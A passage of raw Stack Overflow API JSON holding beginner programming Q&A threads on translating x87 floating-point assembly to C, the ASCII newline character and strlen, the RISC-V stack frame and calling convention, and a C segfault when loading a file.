st(1)\n(gdb)\n9       fstpl   z\n(gdb)\n0x080480d4 in ?? ()\n(gdb) x/gf &amp;z\n0x80490e4:      10\n</code></pre>\n\n<p>Note I have added some test input at the end, and some needed stuff at the top. </p>\n\n<p>You can of course examine all registers during the execution at any point too, see gdb help for other commands.</p>\n"}], "owner": {"reputation": 173, "user_id": 5555969, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206319262238058/picture?type=large", "display_name": "Anastasia Netz", "link": "https://stackoverflow.com/users/5555969/anastasia-netz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 209, "favorite_count": 0, "accepted_answer_id": 34183279, "answer_count": 1, "score": -1, "last_activity_date": 1449676816, "creation_date": 1449674505, "last_edit_date": 1449676816, "question_id": 34182461, "link": "https://stackoverflow.com/questions/34182461/x87-floating-point-instructions-into-c-code", "title": "x87 floating point instructions into C code", "body": "<p>I have this assignment, and x, y, and z are double type variables:</p>\n\n<pre><code>fldl    x\nfldl    y\nfmulp   st, st(1)\nfldl    z\nfaddp   st, st (1)\nfstpl   z\n</code></pre>\n\n<p>Translating this into C, I got this:</p>\n\n<pre><code>z+= x*y\n</code></pre>\n\n<p>I am not sure about z tho? Did I translated it correctly?\nThanks, any help appreciated.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 3, "creation_date": 1449674400, "post_id": 34182351, "comment_id": 56111031, "body": "Any half-decent C programming book has an ASCII table."}, {"owner": {"reputation": 6024, "user_id": 2417459, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/QcuXb.png?s=128&g=1", "display_name": "i486", "link": "https://stackoverflow.com/users/2417459/i486"}, "edited": false, "score": 0, "creation_date": 1449674496, "post_id": 34182351, "comment_id": 56111105, "body": "You can find ASCII 10 code at the end of each line."}, {"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449674600, "post_id": 34182351, "comment_id": 56111169, "body": "@Lundin Sure K&amp;R has got one?"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1449675015, "post_id": 34182351, "comment_id": 56111471, "body": "Googlng &#39;ASCII table&#39; works fine."}, {"owner": {"reputation": 263, "user_id": 5020085, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0yd69.png?s=128&g=1", "display_name": "missjohanna", "link": "https://stackoverflow.com/users/5020085/missjohanna"}, "edited": false, "score": 0, "creation_date": 1449675576, "post_id": 34182351, "comment_id": 56111902, "body": "Can you suggest a good C-Programming Book? Our lectures about C was horrible bad."}], "answers": [{"comments": [{"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1449674725, "post_id": 34182374, "comment_id": 56111255, "body": "Worth noting perhaps that in C it is represented by the escape sequence <code>\\n</code>."}, {"owner": {"reputation": 263, "user_id": 5020085, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0yd69.png?s=128&g=1", "display_name": "missjohanna", "link": "https://stackoverflow.com/users/5020085/missjohanna"}, "edited": false, "score": 0, "creation_date": 1449675515, "post_id": 34182374, "comment_id": 56111856, "body": "Thank you for your explaination! I thought strlen() would already kill escape sequence&#39;s."}, {"owner": {"reputation": 4418, "user_id": 5264388, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/160f1b756f3f4a0ba9a2a58f4cce911b?s=128&d=identicon&r=PG", "display_name": "owacoder", "link": "https://stackoverflow.com/users/5264388/owacoder"}, "reply_to_user": {"reputation": 263, "user_id": 5020085, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0yd69.png?s=128&g=1", "display_name": "missjohanna", "link": "https://stackoverflow.com/users/5020085/missjohanna"}, "edited": false, "score": 0, "creation_date": 1449675617, "post_id": 34182374, "comment_id": 56111940, "body": "@missjohanna - What do you mean by &quot;kill?&quot;"}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "reply_to_user": {"reputation": 263, "user_id": 5020085, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0yd69.png?s=128&g=1", "display_name": "missjohanna", "link": "https://stackoverflow.com/users/5020085/missjohanna"}, "edited": false, "score": 0, "creation_date": 1449677761, "post_id": 34182374, "comment_id": 56113526, "body": "@missjohanna C character escape sequences only appear in the source code, not in the compiled program, so there is nothing to &quot;kill&quot;."}, {"owner": {"reputation": 263, "user_id": 5020085, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0yd69.png?s=128&g=1", "display_name": "missjohanna", "link": "https://stackoverflow.com/users/5020085/missjohanna"}, "edited": false, "score": 0, "creation_date": 1449705963, "post_id": 34182374, "comment_id": 56129167, "body": "I meant that it isnt count as char in a char-array while using strlen(). The &#39;\\0&#39; isnt count aswell."}, {"owner": {"reputation": 4418, "user_id": 5264388, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/160f1b756f3f4a0ba9a2a58f4cce911b?s=128&d=identicon&r=PG", "display_name": "owacoder", "link": "https://stackoverflow.com/users/5264388/owacoder"}, "edited": false, "score": 0, "creation_date": 1449755250, "post_id": 34182374, "comment_id": 56151456, "body": "<code>strlen</code> stops at the first null (<code>&#39;\\0&#39;</code>) character, and counts all others. You should probably read up on the documentation for it."}], "tags": [], "owner": {"reputation": 4418, "user_id": 5264388, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/160f1b756f3f4a0ba9a2a58f4cce911b?s=128&d=identicon&r=PG", "display_name": "owacoder", "link": "https://stackoverflow.com/users/5264388/owacoder"}, "is_accepted": true, "score": 2, "last_activity_date": 1449674995, "last_edit_date": 1449674995, "creation_date": 1449674255, "answer_id": 34182374, "question_id": 34182351, "link": "https://stackoverflow.com/questions/34182351/what-is-the-char-in-c-for-the-int-value-10-where-i-can-look-up-this/34182374#34182374", "title": "What is the char in C for the int value 10? Where I can look up this?", "body": "<p>The value <code>10</code> is the ASCII value for the newline character (LF, or linefeed). Closely related is character <code>13</code>, which is CR, or carriage return, which, on Windows systems, often precedes the LF character. I would suggest getting a copy of the ASCII table (they're all over the web) and referencing it from time to time.</p>\n\n<p>Character <code>10</code> can be represented by <code>'\\n'</code> in C code, as well as <code>'\\012'</code>, <code>'\\x0a'</code>, and <code>'\\u000a'</code>\nCharacter <code>13</code> (carriage return) can be represented by <code>'\\r'</code>, <code>'\\015'</code>, <code>'\\x0d'</code>, and <code>'\\u000d'</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 14006, "user_id": 2204926, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/FDbXT.png?s=128&g=1", "display_name": "Idos", "link": "https://stackoverflow.com/users/2204926/idos"}, "is_accepted": false, "score": 0, "last_activity_date": 1449674292, "creation_date": 1449674292, "answer_id": 34182390, "question_id": 34182351, "link": "https://stackoverflow.com/questions/34182351/what-is-the-char-in-c-for-the-int-value-10-where-i-can-look-up-this/34182390#34182390", "title": "What is the char in C for the int value 10? Where I can look up this?", "body": "<p>It is the newline (LF  (NL line feed, new line)) in <code>ASCII</code>. See all of the values <a href=\"https://www.cs.cmu.edu/~pattis/15-1XX/common/handouts/ascii.html\" rel=\"nofollow\">here</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 18122, "user_id": 476371, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1798dbdad64383304a00c178ad458830?s=128&d=identicon&r=PG", "display_name": "0xC0000022L", "link": "https://stackoverflow.com/users/476371/0xc0000022l"}, "is_accepted": false, "score": 0, "last_activity_date": 1449674619, "creation_date": 1449674619, "answer_id": 34182512, "question_id": 34182351, "link": "https://stackoverflow.com/questions/34182351/what-is-the-char-in-c-for-the-int-value-10-where-i-can-look-up-this/34182512#34182512", "title": "What is the char in C for the int value 10? Where I can look up this?", "body": "<p>As already pointed out by the others, the character 10 in ASCII is LF (line feed).</p>\n\n<p>If you wanted <code>printf</code> to output the character (not see its ordinal value), you could use the <code>%c</code> format specifier to pass a single character.</p>\n\n<p>Example:</p>\n\n<pre><code>printf(\"-%c-\", input[6]);\n</code></pre>\n\n<p>should yield:</p>\n\n<pre><code>-\n-\n</code></pre>\n\n<p>I.e. two dashes separated by a line feed. Please keep in mind that the outcome on Windows depends on how your C runtime handles a single LF without CR as on Windows a line break is customarily represented by CRLF instead of just LF which is the standard on unixoid systems. The only exception to that rule were old Mac systems which used to use only CR to encode a line break.</p>\n"}], "owner": {"reputation": 263, "user_id": 5020085, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0yd69.png?s=128&g=1", "display_name": "missjohanna", "link": "https://stackoverflow.com/users/5020085/missjohanna"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 323, "favorite_count": 0, "accepted_answer_id": 34182374, "answer_count": 3, "score": -2, "last_activity_date": 1449674995, "creation_date": 1449674181, "question_id": 34182351, "link": "https://stackoverflow.com/questions/34182351/what-is-the-char-in-c-for-the-int-value-10-where-i-can-look-up-this", "title": "What is the char in C for the int value 10? Where I can look up this?", "body": "<p>I have a character in a char-Array which I get with fputs(). But it contains a char which is getting count by the function strlen(). I decide to give me out the int value of this char to see where the problem is.</p>\n\n<p>As char I can see nothing. Thought its a Whitespace but not sure. Would like if someone could tell me what it is and explain why it is there.</p>\n\n<pre><code>printf(\"%d\",(int) input[6]); //--&gt; give me the value of 10 out.\n</code></pre>\n"}, {"tags": ["c", "assembly", "calling-convention", "riscv", "stack-frame"], "answers": [{"comments": [{"owner": {"reputation": 43, "user_id": 5659732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb2ca06280766874d9f8a53a34548ac?s=128&d=identicon&r=PG&f=1", "display_name": "Kennerd", "link": "https://stackoverflow.com/users/5659732/kennerd"}, "edited": false, "score": 0, "creation_date": 1449737028, "post_id": 34182916, "comment_id": 56139894, "body": "Your comment exactly pointed out, what I was missing. So the $s0 register (frame pointer (page 93 of the RISC-V ISA) will be used by relative addressing to restore the parameters after the function call. (I tried by using relative addressing based on $sp, which caused the simulator to crash.) When entered the new context of the function, I can use the $s0 (frame pointer) to restore all necessary parameters. I beg your pardon for being somewhat unspecific, but I obviously did not get the concept entirely.)"}, {"owner": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "reply_to_user": {"reputation": 43, "user_id": 5659732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb2ca06280766874d9f8a53a34548ac?s=128&d=identicon&r=PG&f=1", "display_name": "Kennerd", "link": "https://stackoverflow.com/users/5659732/kennerd"}, "edited": false, "score": 0, "creation_date": 1449746798, "post_id": 34182916, "comment_id": 56146093, "body": "Since addressing relative to <code>$sp</code> is valid, if you crashed the simulator I guess that means you messed up the offsets. It should work."}], "tags": [], "owner": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "is_accepted": true, "score": 1, "last_activity_date": 1449675703, "creation_date": 1449675703, "answer_id": 34182916, "question_id": 34182330, "link": "https://stackoverflow.com/questions/34182330/risc-v-assembly-stack-layout-function-call/34182916#34182916", "title": "RISC-V assembly - stack layout - function call", "body": "<p>The first few parameters, type permitting, are passed in registers so they don't even appear on the stack. Other than that, it's unclear what you really want to know. If you do get some arguments that are on the stack, they stay there even after you adjust the stack pointer so you can still address them relative to the adjusted stack pointer or a frame pointer (here <code>$s0</code> apparently). </p>\n\n<blockquote>\n  <p>The important steps, that need clarification are:</p>\n</blockquote>\n\n<pre><code>   10060:   fe010113            addi    sp,sp,-32  # allocate space\n   10064:   00113c23            sd  ra,24(sp)      # save $ra\n   10068:   00813823            sd  s0,16(sp)      # save $s0\n   1006c:   02010413            addi    s0,sp,32   # set up $s0 as frame pointer\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 27199, "user_id": 427158, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f706984800b6d136b9331a6ee20c676f?s=128&d=identicon&r=PG", "display_name": "maxschlepzig", "link": "https://stackoverflow.com/users/427158/maxschlepzig"}, "is_accepted": false, "score": 1, "last_activity_date": 1581876008, "creation_date": 1581876008, "answer_id": 60251489, "question_id": 34182330, "link": "https://stackoverflow.com/questions/34182330/risc-v-assembly-stack-layout-function-call/60251489#60251489", "title": "RISC-V assembly - stack layout - function call", "body": "<p>What you want to know is specified by the RISC-V <a href=\"https://github.com/riscv/riscv-elf-psabi-doc\" rel=\"nofollow noreferrer\">calling conventions</a>.</p>\n\n<p>Main points:</p>\n\n<p>Function arguments are usually passed in the <code>a0</code> to <code>a7</code> registers, not on the stack. An argument is only passed via the stack if there is no room in the <code>a*</code> registers left.</p>\n\n<p>Some registers are caller saved while others are callee saved (cf. Table 26.1, Chapter 26 RISC-V Assembly Programmer\u2019s Handbook, in the <a href=\"https://github.com/riscv/riscv-isa-manual\" rel=\"nofollow noreferrer\">RISC-V base specification</a>, 2019-06-08 ratified). That means before calling a function the caller has to save all caller saved registers to the stack if it wants to retain their content. Similarly, the called function has to save all callee saved registers to the stack if it wants to use them for its own purposes.</p>\n"}], "owner": {"reputation": 43, "user_id": 5659732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb2ca06280766874d9f8a53a34548ac?s=128&d=identicon&r=PG&f=1", "display_name": "Kennerd", "link": "https://stackoverflow.com/users/5659732/kennerd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 8378, "favorite_count": 1, "accepted_answer_id": 34182916, "answer_count": 2, "score": 3, "last_activity_date": 1581876941, "creation_date": 1449674113, "last_edit_date": 1581876941, "question_id": 34182330, "link": "https://stackoverflow.com/questions/34182330/risc-v-assembly-stack-layout-function-call", "title": "RISC-V assembly - stack layout - function call", "body": "<p>currently I am working with a RISC-V processor implementation. I need to run partially hand-crafted assembly code. (Finally there will be dynamic code injection.) For this purpose I have to understand the basics of function calls within RISC-V assembly.</p>\n\n<p>I found this topic very helpful: <a href=\"https://stackoverflow.com/questions/7493785/confusion-about-function-call-stack\">confusion about function call stack</a></p>\n\n<p>But I am still struggling with the stack layout for a function call. Please consider the following c-code:</p>\n\n<pre><code>void some_func(int a, int b, int* c){\n   int cnt = a;\n   for(;cnt &gt; 0;cnt--){\n      *c += b;\n   }\n}\n\nvoid main(){\n   int a = 5;\n   int b = 6;\n   int c = 0;\n\n   some_func(a,b,&amp;c);\n}\n</code></pre>\n\n<p>This program implements a basic multiplication by a sequence of additions. The derived assembly code (riscv64-unknown-elf-gcc -nostartfiles mul.c -o mul &amp;&amp; riscv64-unknown-elf-objdump -D mul) looks like this:</p>\n\n<pre><code>0000000000010000 &lt;some_func&gt;:\n   10000:   fd010113            addi    sp,sp,-48\n   10004:   02813423            sd  s0,40(sp)\n   10008:   03010413            addi    s0,sp,48\n   1000c:   fca42e23            sw  a0,-36(s0)\n   10010:   fcb42c23            sw  a1,-40(s0)\n   10014:   fcc43823            sd  a2,-48(s0)\n   10018:   fdc42783            lw  a5,-36(s0)\n   1001c:   fef42623            sw  a5,-20(s0)\n   10020:   0280006f            j   10048 &lt;some_func+0x48&gt;\n   10024:   fd043783            ld  a5,-48(s0)\n   10028:   0007a703            lw  a4,0(a5)\n   1002c:   fd842783            lw  a5,-40(s0)\n   10030:   00f7073b            addw    a4,a4,a5\n   10034:   fd043783            ld  a5,-48(s0)\n   10038:   00e7a023            sw  a4,0(a5)\n   1003c:   fec42783            lw  a5,-20(s0)\n   10040:   fff7879b            addiw   a5,a5,-1\n   10044:   fef42623            sw  a5,-20(s0)\n   10048:   fec42783            lw  a5,-20(s0)\n   1004c:   fcf04ce3            bgtz    a5,10024 &lt;some_func+0x24&gt;\n   10050:   00000013            nop\n   10054:   02813403            ld  s0,40(sp)\n   10058:   03010113            addi    sp,sp,48\n   1005c:   00008067            ret\n\n0000000000010060 &lt;main&gt;:\n   10060:   fe010113            addi    sp,sp,-32\n   10064:   00113c23            sd  ra,24(sp)\n   10068:   00813823            sd  s0,16(sp)\n   1006c:   02010413            addi    s0,sp,32\n   10070:   00500793            li  a5,5\n   10074:   fef42623            sw  a5,-20(s0)\n   10078:   00600793            li  a5,6\n   1007c:   fef42423            sw  a5,-24(s0)\n   10080:   fe042223            sw  zero,-28(s0)\n   10084:   fe440793            addi    a5,s0,-28\n   10088:   00078613            mv  a2,a5\n   1008c:   fe842583            lw  a1,-24(s0)\n   10090:   fec42503            lw  a0,-20(s0)\n   10094:   f6dff0ef            jal 10000 &lt;some_func&gt;\n   10098:   00000013            nop\n   1009c:   01813083            ld  ra,24(sp)\n   100a0:   01013403            ld  s0,16(sp)\n   100a4:   02010113            addi    sp,sp,32\n   100a8:   00008067            ret\n</code></pre>\n\n<p>The important steps, that need clarification are: (some_func(int,int,int))</p>\n\n<pre><code>   10060:   fe010113            addi    sp,sp,-32\n   10064:   00113c23            sd  ra,24(sp)\n   10068:   00813823            sd  s0,16(sp)\n   1006c:   02010413            addi    s0,sp,32\n</code></pre>\n\n<p>and: (main())</p>\n\n<pre><code>   10000:   fd010113            addi    sp,sp,-48\n   10004:   02813423            sd  s0,40(sp)\n   10008:   03010413            addi    s0,sp,48\n</code></pre>\n\n<p>From my understanding: The stackpointer is moved to make space for return-address and parameters. (Main might be a special case here.) How are the passed arguments treated when located on the stack? How are they obtained back? In general, the methodology is clear to me, but how would I hand-code this segment in order to work.</p>\n\n<p>Regarding the related topic, the stack should look somewhat like</p>\n\n<pre><code>| ???                            |\n| params for some_func() &lt;???&gt;  |\n| ra of some_func()              |\n| locals of main()       &lt;int c&gt; |\n| locals of main()       &lt;int b&gt; |\n| locals of main()       &lt;int a&gt; |\n| params for main()      &lt;None&gt;  |\n</code></pre>\n\n<p>But that is pretty much it. Can anybody point out, how this is arranged, and how these two listings (function call) co-related? </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449674255, "post_id": 34182301, "comment_id": 56110920, "body": "How come you first posted this as <code>board = malloc(SIZE);</code> and then changed to <code>*board = malloc(SIZE);</code>? Which is the original? Is this not a copy-paste of the actual code?"}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 1, "creation_date": 1449674276, "post_id": 34182301, "comment_id": 56110940, "body": "Well, if the file indeed doesn&#39;t exist, <code>loadFile</code> returns without assigning a valid value to <code>*board</code>, but you then attempt to treat it as such (by writing the null terminator in <code>main</code>). So the segfault is expected. As for the file not being there; (I&#39;m assuming a Windows environment) how exactly are you running it? Are you using an IDE, or <code>cmd.exe</code>?"}, {"owner": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "edited": false, "score": 0, "creation_date": 1449674327, "post_id": 34182301, "comment_id": 56110981, "body": "you are providing the address of a pointer that you declared on the stack to a function that gets called on top of it. try dynamically allocating board."}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "reply_to_user": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "edited": false, "score": 0, "creation_date": 1449674389, "post_id": 34182301, "comment_id": 56111021, "body": "@IIIIIIIIIIIIIIIIIIIIIIII Yes, he is, and that&#39;s valid. The other way round would be wrong."}, {"owner": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "reply_to_user": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449674506, "post_id": 34182301, "comment_id": 56111109, "body": "@szczurcio the other way around would be 100% wrong because it would be returning a pointer to a value that has been destroyed. but in this case also cant be a good idea either"}, {"owner": {"reputation": 551, "user_id": 3000271, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/40868737f7c22bc2e27a64ab6d098aa3?s=128&d=identicon&r=PG&f=1", "display_name": "BigBadWolf", "link": "https://stackoverflow.com/users/3000271/bigbadwolf"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449674628, "post_id": 34182301, "comment_id": 56111190, "body": "@Lundin: It Was a copy paste, but I did some formatting in here and accidentally deleted the &#39;*&#39;."}, {"owner": {"reputation": 551, "user_id": 3000271, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/40868737f7c22bc2e27a64ab6d098aa3?s=128&d=identicon&r=PG&f=1", "display_name": "BigBadWolf", "link": "https://stackoverflow.com/users/3000271/bigbadwolf"}, "reply_to_user": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449674749, "post_id": 34182301, "comment_id": 56111274, "body": "@szczurcio That explains the segfault, thank you! I still don&#39;t know where I am wrong on the filename, I have checked and checked and the problem must lie in the code, not the file."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449674787, "post_id": 34182301, "comment_id": 56111314, "body": "@BigBadWolf Ok just making sure you aren&#39;t re-typing the whole code here manually :) Yeah it sounds crazy but some actually do."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449674860, "post_id": 34182301, "comment_id": 56111364, "body": "@szczurcio You should post that as an answer. I was about to point out the very same thing but you beat me to it :)"}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "reply_to_user": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "edited": false, "score": 0, "creation_date": 1449674985, "post_id": 34182301, "comment_id": 56111449, "body": "@IIIIIIIIIIIIIIIIIIIIIIII One could argue that <code>malloc</code>ing memory in a function then expecting the caller to free it is a bad idea, but passing a <code>char**</code> so the function can modify the underlying <code>char*</code> is perfectly fine. The library functions <code>strtox</code> do exactly this (the <code>char** endptr</code> argument)."}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449675069, "post_id": 34182301, "comment_id": 56111514, "body": "@Lundin It&#39;s not really an answer yet because I asked for clarification to find out how OP is running the program, because this might help explain why the file cannot be found."}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449675124, "post_id": 34182301, "comment_id": 56111561, "body": "OP, another idea off the top of my head is the stupid &quot;hide extensions&quot; feature in Windows. It&#39;s possible that you&#39;re trying to open &quot;name&quot; but in reality your file is called for example &quot;name.txt&quot; (but in Windows Exporer you still see it as &quot;name&quot; because of this bug/feature)."}, {"owner": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "reply_to_user": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449675151, "post_id": 34182301, "comment_id": 56111581, "body": "@szczurcio my bad at first glance I thought he is passing char* to function to copy stuff to it. that would overwrite variables on the stack that would come after char* declaration as well as the calee function stack"}, {"owner": {"reputation": 551, "user_id": 3000271, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/40868737f7c22bc2e27a64ab6d098aa3?s=128&d=identicon&r=PG&f=1", "display_name": "BigBadWolf", "link": "https://stackoverflow.com/users/3000271/bigbadwolf"}, "reply_to_user": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449675157, "post_id": 34182301, "comment_id": 56111583, "body": "@szczurcio forgot to answer that! I am compiling and running it with cygwin64 on windows 10, as well as with gcc on debian 32bit. Running it on two different systems and compilers. Same errors."}, {"owner": {"reputation": 551, "user_id": 3000271, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/40868737f7c22bc2e27a64ab6d098aa3?s=128&d=identicon&r=PG&f=1", "display_name": "BigBadWolf", "link": "https://stackoverflow.com/users/3000271/bigbadwolf"}, "reply_to_user": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, 